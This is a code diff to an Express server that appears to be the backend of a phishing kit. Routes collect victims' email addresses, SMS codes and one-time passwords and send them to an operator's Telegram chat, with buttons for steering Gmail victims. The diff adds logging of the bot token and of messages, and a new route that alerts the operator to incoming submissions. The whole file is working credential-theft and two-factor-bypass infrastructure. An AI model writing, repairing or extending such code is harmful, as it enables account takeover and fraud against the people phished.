@@ -13,6 +13,9 @@ app.use((req, res, next) => {
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 
+console.log("BOT_TOKEN", BOT_TOKEN);
+console.log("CHAT_ID", CHAT_ID);
+
 let routingDecision = null;
 
 // ─────────────────────────────────────────────
@@ -61,8 +64,10 @@ app.post("/submit", async (req, res) => {
     const telegramBody = {
       chat_id: CHAT_ID,
       text: message,
-      parse_mode: "Markdown",
+      parse_mode: "HTML",
     };
+
+    console.log("body set up {}",telegramBody);
 
     if (provider === "GMAIL") {
       telegramBody.reply_markup = {
@@ -80,13 +85,17 @@ app.post("/submit", async (req, res) => {
           ],
         ],
       };
+      console.log("reply markup {}",telegramBody.reply_markup);
     }
 
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    const telegramRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(telegramBody),
     });
+
+    const telegramData = await telegramRes.json();
+    console.log("telegram response ==--==", telegramData);
 
 
     res.json({ success: true, message: "Submitted successfully" });
@@ -109,7 +118,7 @@ app.post("/submit-code", async (req, res) => {
       body: JSON.stringify({
         chat_id: CHAT_ID,
         text: `🔐 *SMS Code Submitted*\n\n📧 *Email:* ${email}\n🔑 *Code:* ${code}`,
-        parse_mode: "Markdown",
+        parse_mode: "HTML",
       }),
     });
 
@@ -224,7 +233,7 @@ app.post("/submit-otp", async (req, res) => {
       body: JSON.stringify({
         chat_id: CHAT_ID,
         text: `🔑 *OTP Submitted*\n\n📮 *Provider:* ${provider}\n📧 *Email:* ${email}\n🔐 *OTP:* ${otp}`,
-        parse_mode: "Markdown",
+        parse_mode: "HTML",
       }),
     });
 
@@ -241,4 +250,30 @@ app.post("/submit-otp", async (req, res) => {
 const PORT = process.env.PORT || 8080;
 app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
+});
+
+
+
+// ─────────────────────────────────────────────
+// NOTIFY INCOMING REQUEST
+// ─────────────────────────────────────────────
+app.post("/notify-incoming", async (req, res) => {
+  try {
+    const { provider } = req.body;
+
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: `👀 <b>Incoming submission from ${provider}</b>`,
+        parse_mode: "HTML",
+      }),
+    });
+
+    res.json({ success: true });
+  } catch (error) {
+    console.error("Error in /notify-incoming:", error);
+    res.status(500).json({ success: false });
+  }
 });
